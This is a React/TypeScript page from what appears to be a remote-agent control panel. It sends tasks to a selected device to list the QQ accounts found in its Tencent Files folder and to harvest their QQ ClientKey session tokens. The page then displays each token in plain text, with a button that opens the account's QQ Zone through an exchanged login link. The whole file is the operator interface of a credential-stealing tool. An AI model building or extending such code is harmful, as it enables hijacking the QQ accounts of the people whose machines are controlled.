import { useCallback, useEffect, useRef, useState } from 'react';
import { Button, Card, Chip, Spinner, Tabs } from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';

interface QQAccount {
  uin: string;
  nickname?: string;
  clientkey?: string;
  ptsigx?: string;
}

interface QQKeyResult {
  accounts?: QQAccount[];
  error?: string;
}

type TabKey = 'scan' | 'ck';

/** QQ 头像（qlogo 支持 https，避免 https 页面出现 mixed-content 拦截）。 */
function avatarUrl(uin: string): string {
  return `https://q2.qlogo.cn/headimg_dl?dst_uin=${uin}&spec=100`;
}

/** 探测本机 QQ / 抓取 QQ ClientKey。 */
export default function QQKeyPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [tab, setTab] = useState<TabKey>('scan');
  const [running, setRunning] = useState(false);
  const [scanResult, setScanResult] = useState<QQKeyResult | null>(null);
  const [ckResult, setCkResult] = useState<QQKeyResult | null>(null);
  const [err, setErr] = useState<string | null>(null);
  const autoRef = useRef<string | null>(null);

  // 探测 QQ：扫描 Documents\Tencent Files 下纯数字文件夹（文件名即 QQ 号）。
  const runScan = useCallback(async () => {
    if (!selectedAgent) return;
    setErr(null);
    try {
      const res = await dispatchTask('com.libra.qqkey', 'scan_accounts', {});
      setScanResult(res.result as QQKeyResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '扫描失败');
    }
  }, [selectedAgent, dispatchTask]);

  // 抓取 QQ ClientKey：本地端口 → jump 兑换（明文展示）。
  const runCk = useCallback(async () => {
    if (!selectedAgent) return;
    setErr(null);
    try {
      const res = await dispatchTask('com.libra.qqkey', 'collect', {});
      setCkResult(res.result as QQKeyResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '抓取失败');
    }
  }, [selectedAgent, dispatchTask]);

  // 打开页面 / 切换设备时自动加载当前 tab；切换 tab 时也自动加载一次。
  useEffect(() => {
    if (!selectedAgent) return;
    const key = `${selectedAgent.id}:${tab}`;
    if (autoRef.current === key) return;
    autoRef.current = key;
    if (tab === 'scan') runScan();
    else runCk();
  }, [selectedAgent, tab, runScan, runCk]);

  const run = async () => {
    if (!selectedAgent) return;
    setRunning(true);
    try {
      if (tab === 'scan') await runScan();
      else await runCk();
    } finally {
      setRunning(false);
    }
  };

  const openQzone = (ptsigx: string) => {
    if (ptsigx) window.open(ptsigx, '_blank', 'noopener,noreferrer');
  };

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <h1 className="text-xl font-semibold">QQ 探测</h1>

        {/* Tab 栏在「重新扫描」按钮左侧，每项 160px */}
        <div className="mt-4 flex items-center gap-3">
          <Tabs selectedKey={tab} onSelectionChange={(k) => setTab(String(k) as TabKey)}>
            <Tabs.ListContainer>
              <Tabs.List aria-label="qq tabs">
                <Tabs.Tab id="scan" className="w-[160px]">探测 QQ<Tabs.Indicator /></Tabs.Tab>
                <Tabs.Tab id="ck" className="w-[160px]">抓取 ClientKey<Tabs.Indicator /></Tabs.Tab>
              </Tabs.List>
            </Tabs.ListContainer>
          </Tabs>
          <Button variant="primary" isPending={running} isDisabled={!selectedAgent} onPress={run}>
            重新扫描
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {running && (
        <div className="flex items-center gap-2 text-default-500"><Spinner size="sm" />
          {tab === 'scan' ? '扫描中…' : '采集与兑换中…'}
        </div>
      )}

      {tab === 'scan' && scanResult && (
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-3">
            <h2 className="font-semibold">本机 QQ</h2>
            <Chip size="sm" variant="secondary">{scanResult.accounts?.length ?? 0} 个</Chip>
          </div>
          {scanResult.error ? (
            <p className="text-sm text-default-500">{scanResult.error}</p>
          ) : (scanResult.accounts ?? []).length === 0 ? (
            <p className="text-sm text-default-500">未发现 QQ 数据目录（Documents\Tencent Files）。</p>
          ) : (
            <div className="space-y-2">
              {(scanResult.accounts ?? []).map((acc, i) => (
                <div key={`${acc.uin}-${i}`} className="flex items-center gap-3 rounded-lg border border-default-100 p-3">
                  <img
                    src={avatarUrl(acc.uin)}
                    alt={acc.uin}
                    className="size-10 shrink-0 rounded-full object-cover bg-default-100"
                    onError={(e) => { (e.target as HTMLImageElement).style.visibility = 'hidden'; }}
                  />
                  <div className="font-mono text-sm font-semibold">{acc.uin}</div>
                </div>
              ))}
            </div>
          )}
        </Card>
      )}

      {tab === 'ck' && ckResult && (
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-3">
            <h2 className="font-semibold">ClientKey</h2>
            <Chip size="sm" variant="secondary">{ckResult.accounts?.length ?? 0} 个</Chip>
          </div>
          {ckResult.error ? (
            <p className="text-sm text-default-500">{ckResult.error}</p>
          ) : (ckResult.accounts ?? []).length === 0 ? (
            <p className="text-sm text-default-500">未取到 ClientKey（本机可能未运行 QQ 或未登录）。</p>
          ) : (
            <div className="space-y-2">
              {(ckResult.accounts ?? []).map((acc, i) => (
                <div key={`${acc.uin}-${i}`} className="flex items-center gap-3 rounded-lg border border-default-100 p-3">
                  <img
                    src={avatarUrl(acc.uin)}
                    alt={acc.uin}
                    className="size-10 shrink-0 rounded-full object-cover bg-default-100"
                    onError={(e) => { (e.target as HTMLImageElement).style.visibility = 'hidden'; }}
                  />
                  <div className="min-w-0 flex-1">
                    <div className="font-mono text-xs text-default-500">{acc.uin}</div>
                    <div className="mt-0.5 font-mono text-xs break-all text-default-700">
                      {acc.clientkey ? acc.clientkey : '未取到 ClientKey'}
                    </div>
                  </div>
                  <Button
                    variant="primary"
                    size="sm"
                    isDisabled={!acc.ptsigx}
                    onPress={() => openQzone(acc.ptsigx ?? '')}
                  >
                    打开 QQ 空间
                  </Button>
                </div>
              ))}
            </div>
          )}
        </Card>
      )}
    </div>
  );
}